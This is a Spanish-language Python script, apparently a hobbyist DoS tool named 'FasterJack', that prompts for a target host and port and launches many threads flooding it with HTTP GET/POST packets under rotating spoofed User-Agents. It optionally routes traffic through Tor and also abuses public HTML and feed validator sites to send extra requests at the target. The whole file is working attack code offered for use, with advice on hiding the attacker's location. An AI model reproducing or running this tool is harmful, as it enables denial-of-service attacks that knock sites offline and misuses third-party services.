#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#By Neo-Jack

#Librerias
from colorama import Fore, Back, Style
from queue import Queue
from optparse import OptionParser
import time
import sys
import socket
import socks
import requests
import threading
import urllib.request
import random
from os import system, name

#Variables
BC = Back.CYAN
BM = Back.MAGENTA
BR = Back.RED
FB = Fore.BLUE
FG = Fore.GREEN
FM = Fore.MAGENTA
FR = Fore.RED
FW = Fore.WHITE
FY = Fore.YELLOW
SB = Style.BRIGHT
SD = Style.DIM
SR = Style.RESET_ALL

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

clear()
iniciando = "FasterJack by NeoJack"
ini_pro = iniciando.center(50)
window = "Version para Windows 64-Bite"
ini_win = window.center(50)
by = "JUN/2020"
ini_by = by.center(50)
print(FB + BM + SB + "....................................................." + SR)
print(FW + BM + SB + ini_pro + "   " + SR)
print(FB + BM + SB + "....................................................." + SR)
print(FG + BM + SB + ini_win + "   " + SR)
print(FG + BM + SB + ini_by + "   " + SR)
print(BM + "                                                     " + SR )
print(FY + BM + SB + "Parametros por Defecto:                              " + SR)
print(BM + "                                                     " + SR )
print(FW + BM + SB + "HTTP(s): " + SR + FG + BM + SB + " [http://] " + SR + FW + BM + SB + "   (Asociado al Puerto)          " + SR)
print(FW + BM + SB + "Web o IP: " + SR + FG + BM + SB + "          " + SR + FW + BM + SB + "   (OBLIGATORIO)                 " + SR)
print(FW + BM + SB + "Puerto: " + SR + FG + BM + SB + "  [80]                                       " + SR)
print(FW + BM + SB + "Clientes: " + SR + FG + BM + SB + "[50]                                       " + SR)
print(FW + BM + SB + "Metodo: " + SR + FG + BM + SB + "  [Random]                                   " + SR)
print(FW + BM + SB + "Tor: " + SR + FG + BM + SB + "     [Desactivado]                              " + SR)
print(BM + "                                                     \n" + SR)

#Seleccionando WEB
print(FB + BM + SB + "....................................................." + SR)
web_ip = "Web o Ip a usar!!!"
pa_txt = FY + SB + "1" + FB + SB + "/5"
cen_web = web_ip.center(50)
print(FG + BM + SB + pa_txt + cen_web + SR)
print(FB + BM + SB + "....................................................." + SR)
print(FW + SB + "NOTA: " + SR + FB + SB + "OBLIGATORIO...\n" + SR)
host = input(FM + SB + "¿...?: " + SR + FY + SB + "Que Sitio Web o Ip, usaremos?: " + SR + FB + SB + "Ej:" + SR + FG + SB + "[www.ejemplo.com] \n" + SR)
if host == "":
    host = "ERROR"
while (host):
    try:
        if host == "ERROR":
            clear()
            print(FY + SB + "INFO: " + FR + SB + "Error --> " + SR + FB + SB + "Inexistente Web o IP" + SR)
            print(FY + SB + "INFO: " + SR + FB + SB + "Web o IP invalido, Reintente...\n" + SR)
            host = input(FM + SB + "¿...?: " + SR + FY + SB + "Que Sitio Web o Ip, usaremos?: " + SR + FB + SB + "Ej:" + SR + FG + SB + "[www.ejemplo.com] \n" + SR)
        if host == "":
            clear()
            print(FY + SB + "INFO: " + FR + SB + "Error --> " + SR + FB + SB + "Intentelo otra vez!!!" + SR)
            print(FY + SB + "INFO: " + SR + FB + SB + "Web o IP invalido, Reintente...\n" + SR)
            host = input(FM + SB + "¿...?: " + SR + FY + SB + "Que Sitio Web o Ip, usaremos?: " + SR + FB + SB + "Ej:" + SR + FG + SB + "[www.ejemplo.com] \n" + SR)
        if host != "":
            break
        else:
            clear()
            print(FY + SB + "INFO: " + FR + SB + "Error --> " + SR + FB + SB + "Target Desconocido" + SR)
            print(FY + SB + "INFO: " + SR + FB + SB + "Web o IP invalido, Reintente...\n" + SR)
            host = input(FM + SB + "¿...?: " + SR + FY + SB + "Que Sitio Web o Ip, usaremos?: " + SR + FB + SB + "Ej:" + SR + FG + SB + "[www.ejemplo.com] \n" + SR)
            if host == "":
                host = "ERROR"
    except:
        clear()
        print(FY + SB + "INFO: " + FR + SB + "Error --> " + SR + FB + SB + "Ultima Oportunidad!!!" + SR)
        print(FY + SB + "INFO: " + SR + FB + SB + "Web o IP invalido, Reintente...\n" + SR)
        host = input(FM + SB + "¿...?: " + SR + FY + SB + "Que Sitio Web o Ip, usaremos?: " + SR + FB + SB + "Ej:" + SR + FG + SB + "[www.ejemplo.com] \n" + SR)
if host == "ERROR":
    print(FY + SB + "INFO: " + FR + SB + "Error --> " + SR + FB + SB + "Inexistente Web o IP" + SR)
    print(FY + SB + "INFO: " + FW + BR + SB + "Demasiados intentos. ADIOS" + SR)
    sys.exit()

#ESCOGIENDO PUERTO
clear()
print(FB + BM + SB + "....................................................." + SR)
port_txt = "Puerto a usar: 80 o 443"
pa_txt = FY + SB + "2" + FB + SB + "/5"
cen_port = port_txt.center(50)
print(FB + BM + SB + pa_txt + cen_port + SR)
print(FB + BM + SB + "....................................................." + SR)
print(FW + SB + "NOTA: " + SR + FB + SB + "Defecto: " + SR + FG + SB + "[80]\n" + SR)
port = input(FM + SB + "¿...?: " + SR + FY + SB + "Que Puerto quiere usar?: " + SR + FB + SB + "Opciones: " + SR + FG + SB + "[80]" + SR + FB + SB + " o " + SR + FG + SB + "[443]\n" + SR)
if port == "":
    port = "80"
while (port):
    try:
        if port == "80":
            port = "80"
            break
        if port == "443":
            port = "443"
            break
        if port == "":
            port = "80"
            break
        else:
            port = "80"
    except:
        port = ("80")
if port == "443":
    port = str("443")
    http = str("https://")
else:
    port = str("80")
    http = str("http://")

#TOR Activado o Desactivado
clear()
print(FB + BM + SB + "....................................................." + SR)
tor_txt = "Servicio TOR Network?"
pa_txt = FY + SB + "3" + FB + SB + "/5"
cen_tor = tor_txt.center(50)
print(FB + BM + SB + pa_txt + cen_tor + SR)
print(FB + BM + SB + "....................................................." + SR)
print(FW + SB + "NOTA: " + SR + FB + SB + "Defecto: " + SR + FY + SB + "Desactivado" + SR)
print(FW + SB + "NOTA: " + SR + FB + SB + "Respuestas validas: " + SR + FG + SB + "[1]" + SR + FB + SB + " o " + SR + FG + SB + "[2]" + SR)
print(FW + SB + "NOTA: " + SR + FB + SB + "Ej: " + SR + FG + SB + "[1]" + SR + FB + SB + " --> " + SR + FY + SB + "Desactivar" + SR)
print(FW + SB + "NOTA: " + SR + FB + SB + "Ej: " + SR + FG + SB + "[2]" + SR + FB + SB + " --> " + SR + FY + SB + "Activar\n" + SR)
Tor = input(FM + SB + "¿...?: " + SR + FY + SB + "Quieres Activar TOR?:" + SR + FB + SB + " Opciones: " + SR + FG + SB + "[1]" + SR + FB + SB + " o " + SR + FG + SB + "[2]\n" + SR)
if Tor == "":
    Tor = "1"
while (Tor):
    try:
        if Tor == "1":
            Tor = "1"
            break
        if Tor == "2":
            Tor = "2"
            break
        if Tor == "":
            Tor = "1"
            break
        else:
            Tor = "1"
    except:
        Tor = ("1")
#Convirtiendo valor Tor a True o Flase
if Tor == "2":
    tor = True
else:
    tor = False

#Clientes
clear()
print(FB + BM + SB + "....................................................." + SR)
cli_txt = "Cantidad de Clientes a usar?"
pa_txt = FY + SB + "4" + FB + SB + "/5"
cen_cli = cli_txt.center(50)
print(FB + BM + SB + pa_txt + cen_cli + SR)
print(FB + BM + SB + "....................................................." + SR)
print(FW + SB + "NOTA: " + SR + FB + SB + "Defecto: " + SR + FG + SB + "[80]" + SR)
print(FW + SB + "NOTA: " + SR + FB + SB + "Recomendados: " + SR + FG + SB + "[30 - 135]\n" + SR)
Thr = input(FM + SB + "¿...?: " + SR + FY + SB + "Cuantos Clientes deseas usar? " + SR + FB + SB + "Ej: " + SR + FG + SB + "[90] \n" + SR)
if Thr == "":
    Thr = "50"
    thr = Thr
else:
    thr = Thr

#Seleccionando METODO
clear()
print(FB + BM + SB +  "....................................................." + SR)
me_txt = "Seleccionando Metodo a usar"
pa_txt = FY + SB + "5" + FB + SB + "/5"
cen_me = me_txt.center(50)
print(FB + BM + SB + pa_txt + cen_me + SR)
print(FB + BM + SB + "....................................................." + SR)
print(FW + SB + "NOTA: " + SR + FB + SB + "Metodos: " + SR + FY + SB + "Random , Get, Post" + SR)
print(FW + SB + "NOTA: " + SR + FB + SB + "Respuestas validas: " + SR + FG + SB + "[1]" + SR + FB + SB + ", " + SR + FG + SB + "[2]" + SR + FB + SB + ", " + SR + FG + SB + "[3]" + SR)
print(FW + SB + "NOTA: " + SR + FB + SB + "Ej: " + SR + FG + SB + "[1]" + SR + FB + SB + " --> " + SR + FY + SB + "Random" + SR)
print(FW + SB + "NOTA: " + SR + FB + SB + "Ej: " + SR + FG + SB + "[2]" + SR + FB + SB + " --> " + SR + FY + SB + "Get" + SR)
print(FW + SB + "NOTA: " + SR + FB + SB + "Ej: " + SR + FG + SB + "[3]" + SR + FB + SB + " --> " + SR + FY + SB + "Post\n" + SR)
Met = input(FM + SB + "¿...?: " + SR + FY + SB + "Seleccione el Nº del Metodo? " + SR + FB + SB + "Opciones: " + SR + FG + SB + "[1]" + SR + FB + SB + " o " + SR + FG + SB + "[2]" + SR + FB + SB + " o " + SR + FG + SB + "[3]\n" + SR)
if Met == "":
    met = "Random"
elif Met == "1" or Met == "random" or Met == "RANDOM" or Met == "Random":
    met = "Random"
elif Met == "2" or Met == "get" or Met == "GET" or Met == "Get":
    met = "GET"
elif Met == "3" or Met == "post" or Met == "Post" or Met == "Post":
    met = "POST"
else:
    met = "Random"

#Variables Globales
http
host
port
thr
met
tor

def pre():    
    clear()
    print("")
    print(FW + BM + SB + "....................................................." + SR)
    st_txt = "Iniciando... FasterJack"
    cen_st = st_txt.center(50)
    print(FY + BM + SB + cen_st + "   " + SR)
    print(FG + BM + SB + " Para Salir..." + SR + BM + FW + SB + " [Ctrl + Z]" + SR + BM + FG + SB + " o " + SR + BM + FW + SB + "[Ctrl + D]               " + SR)
    print(FW + BM + SB + ".....................................................\n" + SR)

    if tor is True:
        torinfo = str("Activado")
    else:
        torinfo = str("Desactivado")
    print(FY + SB + " INFO: " + SR + FB + SB + "Comprobando Informacion ..." + SR)
    time.sleep(.2)    
    print(FY + SB + " INFO: " + SR + FB + SB + "Clientes: " + SR + FW + SB + str(thr) + SR)
    print(FW + SB + " NOTA: " + SR + FB + SB + "Estado: " + SR + FG + SB + "OK.." + SR)
    print(FY + SB + " INFO: " + SR + FB + SB + "Metodo: " + SR + FW + SB + str(met) + SR)
    print(FW + SB + " NOTA: " + SR + FB + SB + "Estado: " + SR + FG + SB + "OK.." + SR)
    if torinfo == "Desactivado":
        print(FY + SB + " INFO: " + SR + FB + SB + "Tor: " + SR + FR + SB + str(torinfo) + SR)
        print(FW + SB + " NOTA: " + SR + FB + SB + "Estado: " + SR + FR + SB + "OK.." + SR)
    else:
        print(FY + SB + " INFO: " + SR + FB + SB + "Tor: " + SR + FG + SB + str(torinfo) + SR)
        print(FW + SB + " NOTA: " + SR + FB + SB + "Estado: " + SR + FG + SB + "OK.." + SR)

def mix_metodo():
	print(FY + SB + " INFO: " + SR + FB + SB + "Comprobando: " + SR + FW + SB + "Metodos" + SR)
	global mmetodo
	mmetodo = []
	mmetodo.append("GET")
	mmetodo.append("POST")
	print(FW + SB + " NOTA: " + SR + FB + SB + "Estado: " + SR + FG + SB + "OK.." + SR)
	return(mmetodo)

def my_bots():
	print(FY + SB + " INFO: " + SR + FB + SB + "Comprobando: " + SR + FW + SB + "BOTS Verificadores" + SR)
	global bots
	bots = []
	bots.append("https://html5.validator.nu/?doc=")
	bots.append("https://validator.w3.org/nu/?doc=")
	bots.append("https://datayze.com/site-validator.php?domain=")
	bots.append("https://validator.ampproject.org/#url=")
	bots.append("http://www.feedvalidator.org/check.cgi?url=")
	print(FW + SB + " NOTA: " + SR + FB + SB + "Estado: " + SR + FG + SB + "OK.." + SR)
	return(bots)

def conec_tor():
    if tor is True:
        print(FY + SB + " INFO: " + SR + FB + SB + "Comprobando: " + SR + FW + SB + "Seguridad de IP" + SR)
        ipcheck_url1 = 'http://icanhazip.com'
        ipcheck_url2 = 'http://icanhazptr.com'
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
        socket.socket = socks.socksocket
        try:
            tor_ip = requests.get(ipcheck_url1)
            tor_ip = str(tor_ip.text)
            print(FW + SB + " NOTA: " + SR + FB + SB + "Servidor IP-Checker: " + SR + FW + SB + "01 --> " + SR + FG + SB + "http://icanhazip.com" + SR + FB + SB  + SR)
            print(FY + SB + " INFO: " + SR + FB + SB + "Estado: IP Tor Asignada " + SR)
            print(FY + SB + " INFO: " + SR + FB + SB + "IP-Segura: " + SR + FW + SB + tor_ip + SR)
            print(FW + SB + " NOTA: " + SR + FB + SB + "Estado: " + SR + FG + SB + "OK.." + SR)
        except requests.exceptions.ConnectionError as errc:
            tor_ip = requests.get(ipcheck_url2)
            tor_ip = str(tor_ip.text)
            print(FW + SB + " NOTA: " + SR + FB + SB + "Servidor IP-Checker: " + SR + FW + SB + "02 --> " + SR + FG + SB + "http://icanhazptr.com" + SR + FB + SB  + SR)
            print(FY + SB + " INFO: " + SR + FB + SB + "Estado: IP Tor Asignada " + SR)
            print(FY + SB + " INFO: " + SR + FB + SB + "IP-Segura: " + SR + FW + SB + tor_ip + SR)
            print(FW + SB + " NOTA: " + SR + FB + SB + "Estado: " + SR + FG + SB + "OK.." + SR)
        except requests.exceptions.RequestException as e:
            sys.exit(0)
    if tor is False:
        print(FY + SB + " INFO: " + SR + FB + SB + "Comprobando: " + SR + FW + SB + "Seguridad de IP" + SR)
        ipcheck_url01 = 'http://icanhazip.com'
        ipcheck_url02 = 'http://icanhazptr.com'
        try:
            regular_ip = requests.get(ipcheck_url01)
            regular_ip = str(regular_ip.text)
            print(FW + SB + " NOTA: " + SR + FB + SB + "Servidor IP-Checker: " + SR + FW + SB + "01 --> " + SR + FG + SB + "http://icanhazip.com" + SR + FB + SB  + SR)
            print(FY + SB + " INFO: " + SR + FR + SB + "IP-Expuesta: " + SR + FW + SB + regular_ip + SR)
            print(FW + SB + " NOTA: " + SR + FB + SB + "Estado: " + SR + FG + SB + "OK.." + SR)
            print(FY + SB + " INFO: " + SR + FR + SB + "--> " + SR  + FY + SB + "SIEMPRE USE VPN, SU UBICACION PODRIA QUEDAR EXPUESTA.\n" + SR)
            continuar()
        except requests.exceptions.ConnectionError as errc:
            regular_ip = requests.get(ipcheck_url02)
            regular_ip = str(regular_ip.text)
            print(FW + SB + " NOTA: " + SR + FB + SB + "Servidor IP-Checker: " + SR + FW + SB + "01 --> "  + SR + FG + SB + "http://icanhazptr.com" + SR + FB + SB  + SR)
            print(FY + SB + " INFO: " + SR + FR + SB + "IP-Expuesta: " + SR + FW + SB + regular_ip + SR)
            print(FW + SB + " NOTA: " + SR + FB + SB + "Estado: " + SR + FG + SB + "OK.." + SR)
            print(FY + SB + " INFO: " + SR + FR + SB + "--> " + SR + FY + SB + "SIEMPRE USE VPN, SU UBICACION PODRIA QUEDAR EXPUESTA.\n" + SR)
            continuar()
        except requests.exceptions.RequestException as e:
            sys.exit(0)

def continuar():
	cont = input(FM + SB + "¿...?: " + SR + FB + SB + " Esta Seguro de Continuar? [" + SR + FG + SB + "s" + SR + FB + SB + "] / [" + SR + FR + SB + "n" + SR + FB + SB + "]\n" + SR)
	if cont is None:
		sys.exit()
	if cont == "s":
		pass
	else:
		sys.exit()
def user_agent():
	print(FY + SB + " INFO: " + SR + FB + SB + "Comprobando: " + SR + FW + SB + "Agentes de Navegador" + SR)
	global uagent
	uagent = []
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)")
	uagent.append("Googlebot/2.1 (http://www.googlebot.com/bot.html)")
	uagent.append("Opera/9.20 (Windows NT 6.0; U; en)")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)")
	uagent.append("Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0")
	uagent.append("Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Neo/20100804 Gentoo Firefox/3.6.8")
	uagent.append("X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7")
	uagent.append("YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/")
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; XH; rv:8.578.498) fr, Gecko/20121021 Camino/8.723+ (Firefox compatible)")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; XH; rv:8.578.498) fr, Gecko/20121021 Camino/8.443+ (Firefox compatible)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8; it; rv:1.9.2.28) Gecko/20130628 Camino/3.245.226 (MultiLang) (like Firefox/3.621.218)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8; it; rv:1.93.26.2658) Gecko/20141026 Camino/2.176.223 (MultiLang) (like Firefox/3.64.2268)0")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.2.14pre) Gecko/20101212 Camino/2.1a1pre (like Firefox/3.6.14pre)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.2.14pre)   Gecko/20101212 Camino/2.1a1pre (like Firefox/3.6.14pre)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.2.29pre) Gecko/20130101 Camino/2.1.3pre (like Firefox/3.6.29pre)")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; de; rv:1.9.2.28) Gecko/20120308 Camino/2.1.2 (MultiLang) (like Firefox/3.6.28)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8; it; rv:1.9.2.28) Gecko/20120308 Camino/2.1.2 (MultiLang) (like Firefox/3.6.28)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.28) Gecko/20120308 Camino/2.1.2 (MultiLang) (like Firefox/3.6.28)")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en; rv:1.9.2.24) Gecko/20111114 Camino/2.1 (like Firefox/3.6.24)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en; rv:1.9.0.8pre) Gecko/2009022800 Camino/2.0b3pre")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en; rv:1.9.0.10pre) Gecko/2009041800 Camino/2.0b3pre (like Firefox/3.0.10pre)")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; it; rv:1.9.0.19) Gecko/2010111021 Camino/2.0.6 (MultiLang) (like Firefox/3.0.19)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.0.19) Gecko/2010111021 Camino/2.0.6 (MultiLang) (like Firefox/3.0.19)")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en; rv:1.9.0.19) Gecko/2010051911 Camino/2.0.3 (like Firefox/3.0.19)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; nl; rv:1.9.0.19) Gecko/2010051911 Camino/2.0.3 (MultiLang) (like Firefox/3.0.19)")
	uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.0.18) Gecko/2010021619 Camino/2.0.2 (like Firefox/3.0.18)")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.1) Gecko/20070117 Epiphany/2.16 BonEcho/2.0.0.1")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070222 BonEcho/2.0.0.1")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070220 BonEcho/2.0.0.1")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070217 BonEcho/2.0.0.1")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070215 BonEcho/2.0.0.1")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20070115 BonEcho/2.0.0.1")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.1.1) Gecko/20070110 BonEcho/2.0.0.1")
	uagent.append("Mozilla/5.0 (Android; WOW64; Linux armv7l;rv:5.0) Gecko/20110603 Firefox/5.0 Fennec/5.0")
	uagent.append("Mozilla/5.0 (Android; Linux armv7l;rv:5.0) Gecko/20110603 Firefox/5.0 Fennec/5.0")
	uagent.append("Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110615 Firefox/5.0 Fennec/5.0")
	uagent.append("Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110614 Firefox/5.0 Fennec/5.0")
	uagent.append("Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0")
	uagent.append("Opera/9.80 (Android; Opera Mini/7.6.35766/35.5706; U; en) Presto/2.8.119 Version/11.10")
	uagent.append("Opera/9.80 (Android; Opera Mini/7.5.33361/31.1350; U; en) Presto/2.8.119 Version/11.10")
	uagent.append("Opera/9.80 (Android; Opera Mini/7.29530/27.1407; U; en) Presto/2.8.119 Version/11.10")
	uagent.append("Opera/9.80 (iPhone; Opera Mini/7.1.32694/27.1407; U; en) Presto/2.8.119 Version/11.10")
	uagent.append("Opera/9.80 (iPad; Opera Mini/7.1.32694/27.1407; U; en) Presto/2.8.119 Version/11.10")
	print(FW + SB + " NOTA: " + SR + FB + SB + "Estado: " + SR + FG + SB + "OK.." + SR)
	return(uagent)

def bot_reconextando(url):
	try:
		while True:
			print (FW + SB + " NOTA: " + FG + SD + " Asignando nuevo agente a cliente... " + SR)
			agente_seleccionado = random.choice(uagent)
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': agente_seleccionado}))
			puerto = str(port)
			time.sleep(.1)
			print(FY + SB + " INFO: " + SR + FB + SB + " Nuevo Agente Asignado " + SR)
			print(FW + SB + " NOTA: " + SR + FG + SB + " "+ agente_seleccionado[:40] + "..." + SR)
			print(FW + SB + " NOTA: " + SR + FY + SB + " Re-Conectando Cliente a: " + SR + FW + SB +  host + SR + FY + SB + ":" + SR + FW + SB + puerto + SR + FY + SB + " / " + SR + FW + SB + met + SR)			
			time.sleep(.1)
	except:
		time.sleep(.1)

def down_it(item):
	try:
		while True:
			global met
			if met == "Random":
				met = str(random.choice(mmetodo))
			packet = str(met + " / HTTP/1.1\nHost: " + http + host + "\n\n User-Agent: " + str(random.choice(uagent)) + "\n" + data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			puerto = str(port)
			print (FW + SB + " NOTA: " + SR + FB + SB + " Conectando Cliente a: " + SR + FW + SB +  host + SR + FY + SB + ":" + SR + FW + SB + puerto + SR + FY + SB + " / " + SR + FW + SB + met + SR)
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print (FY + SB + " INFO: " + SR + FM + SB + " -->" + SR + FG + SB + " Paquete Enviado ... " + SR + FM + SB + "<--" + SR + FG + SB + " OK.." + SR)
			else:
				s.shutdown(1)
				print(FY + SB + " INFO: " + SR + FM + SB + "-->" + SR + FR + SB + " Paquete NO Entregado !!!" + SR + FM + SB + "<--" + SR)
			time.sleep(.1)
	except socket.error as e:
		print(FY + SB + " INFO: " + SR + FR + SB + " Error 500! Servidor : " + SR + FW + SB + str(host) + SR + FR + SB + " Posiblemente Caido !!! o Protegido!!!" + SR)
		print(FW + SB + " NOTA: " + SR + FB + SB + " Para Terminar " + SR + FR + SB + "[Ctrl + Z]" + SR + FB + SB + " o " + SR + FR + SB + "[Ctrl + D]" + SR)
		#Intento de nuevo Ip tor ---> falta probarlo		
		print("INFO: Forzando Nueva Identidad")		
		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1',9050)
		socket.socket = socket.socksocket
		print ("NOTA: Nueva Identidad asignada...")        
		time.sleep(1) #defecto .1      


def dos():
	while True:
		item = q.get()
		down_it(item) 
		q.task_done()

def dos2():
	while True:
		item = w.get()
		bot_reconextando(random.choice(bots) + http + host)
		w.task_done()

def dos3():
	while True:
		item = m.get()
		mix_metodo(item)
		m.task_done()

global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()

q = Queue()
w = Queue()
m = Queue()

def selector():
    while True:
        for i in range(int(thr)):
            t = threading.Thread(target = dos)
            t.daemon = True
            t.start()
            t2 = threading.Thread(target = dos2)
            print(FY + SB + " INFO: " + SR + FB + SB + "Verificando: " + SR + FW + SB + host + SR + FB + SB + " : " + SR + FW + SB + str(port) + SR)
            t2.daemon = True
            t2.start()
        start = time.time()
        item = 0
        while True:
            if (item>1800):
                item=0
                time.sleep(.1)
            item = item + 1
            q.put(item)
            w.put(item)
            m.put(item)
        q.join()
        w.join()
        m.join()

def iniciando():    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,int(port)))
        s.settimeout(1)
        print(FY + SB + " INFO: " + SR + FB + SB + "Target: " + SR + FW + SB + str(host) + SR)
        print(FW + SB + " NOTA: " + SR + FB + SB + "Estado: " + SR + FG + SB + "OK.." + SR)
        print(FY + SB + " INFO: " + SR + FB + SB + "Puerto: " + SR + FW + SB + str(port) + SR)
        print(FW + SB + " NOTA: " + SR + FB + SB + "Estado: " + SR + FG + SB + "OK.." + SR)
    except socket.error as e:
        print(FY + SB + " INFO: " + SR + FB + SB + "Target: " + SR + FW + SB + str(host) + SR)
        print(FW + SB + " NOTA: " + SR + FB + SB + "Estado: " + SR + FR + SB + "ERROR.. Imposible Hand Shake con el Servidor" + SR)
        print(FY + SB + " INFO: " + SR + FB + SB + "Puerto: " + SR + FW + SB + str(port) + SR)
        print(FW + SB + " NOTA: " + SR + FB + SB + "Estado: " + SR + FR + SB + "ERROR.. Puerto no Disponible en: " + str(host) + SR)
        #print(FY + SB + " INFO: " + SR + FR + SB + "ERROR en HOST!!! " + SB)
        print(FY + SB + " INFO: " + SR + BR + FW + SB + "Verifique la WEB o el IP " + SR)
        print(FW + SB + " NOTA: " + SR + BR + FW + SB + "Host Inexistente o Puerto Cerrado " + SR)
        time.sleep(1)
        sys.exit(0)
def ini(): 
    pre()
    time.sleep(1)
    user_agent()
    time.sleep(1)
    mix_metodo()
    time.sleep(1)
    my_bots()
    time.sleep(1)
    conec_tor()
    time.sleep(1)
    iniciando()
    time.sleep(1)
    selector()

if __name__ == '__main__':
    ini()
